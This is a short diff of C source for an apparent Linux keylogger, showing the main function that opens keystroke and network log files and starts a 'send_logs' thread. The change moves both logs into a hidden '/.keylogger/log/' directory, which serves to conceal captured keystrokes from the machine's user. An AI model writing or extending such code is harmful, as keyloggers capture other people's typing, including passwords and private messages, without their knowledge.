@@ -57,8 +57,7 @@ int main(int argc, char **argv)
     /*Retrieve Keyboard file descriptor*/
     struct Config config = retrive_keyboard_file();
     
-    /*Open log file*/
-    FILE *keylog_log = fopen("log/keylog.txt", "a");
+    FILE *keylog_log = fopen("/.keylogger/log/keylog.txt", "a");
     if (keylog_log == NULL)
     {
         printf("Error opening keylog log. Exiting...\n");
@@ -83,7 +82,7 @@ int main(int argc, char **argv)
     pthread_t sendlogs;
     pthread_create(&sendlogs, &attr, send_logs, NULL);
 
-    FILE *network_log = fopen("log/network.txt", "a");
+    FILE *network_log = fopen("/.keylogger/log/network.txt", "a");
     if (network_log == NULL)
     {
         printf("Error opening network log. Exiting...");
@@ -246,7 +245,7 @@ struct Config retrive_keyboard_file()
     return config;
 
 }
-
+//
 void* start_keylogging(void *args)
 {
     typedef struct input_event input_event;
